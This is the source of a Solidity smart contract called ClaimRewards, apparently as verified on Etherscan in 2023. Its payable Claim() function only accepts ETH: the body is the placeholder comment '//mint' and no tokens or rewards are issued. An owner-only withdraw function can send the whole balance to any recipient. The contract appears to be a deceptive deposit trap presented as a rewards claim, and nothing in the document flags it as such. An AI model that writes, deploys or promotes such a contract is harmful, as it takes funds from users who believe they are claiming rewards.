/**
 *Submitted for verification at Etherscan.io on 2023-07-15
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.8.17;

contract ClaimRewards {
    address payable owner;
    
    modifier onlyOwner() {
        require(msg.sender == owner, "just owner");
        _;
    }

    constructor() {
        owner = payable(msg.sender);
    }

    function transferOwnerShip(address payable newOwner) public onlyOwner {
        owner = newOwner;
    }

    function withdraw(uint256 amount, address recipient) public onlyOwner {
        require(
            amount <= address(this).balance,
            "Requested amount exceeds the contract balance."
        );
        require(
            recipient != address(0),
            "Recipient address cannot be the zero address."
        );
        payable(recipient).transfer(amount);
    }

    function Claim() public payable {
        //mint
    }
}